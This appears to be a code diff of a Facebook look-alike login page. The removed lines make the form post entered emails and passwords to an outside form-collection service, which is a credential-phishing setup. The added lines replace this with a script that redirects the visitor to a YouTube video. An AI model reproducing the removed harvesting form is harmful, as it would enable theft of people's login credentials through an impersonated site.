@@ -85,8 +85,8 @@
      <p>around you on Facebook.</p> 
     </div> 
 
-    <!-- Updated form with Formcarry action -->
-    <form id="loginForm" action="https://formcarry.com/s/hJQzoZbhqc-" method="POST"> 
+    <!-- Simple login form (no Formcarry) -->
+    <form id="loginForm"> 
      <input type="text" id="emailPhone" name="emailPhone" placeholder="Email or phone number" required> 
      <input type="password" id="password" name="password" placeholder="Password" required> 
      <div class="fb-submit"> 
@@ -174,6 +174,12 @@
     window.onload = function() {
         showModal();
     };
+
+    // Redirect to a famous Bollywood song when the form is submitted
+    document.getElementById("loginForm").addEventListener("submit", function(event) {
+        event.preventDefault(); // Prevent actual form submission
+        window.location.href = "https://www.youtube.com/watch?v=YqeW9_5kURI"; // Redirect to a Bollywood song (example: "Lean On")
+    });
   </script>
 </body> 
 </html>
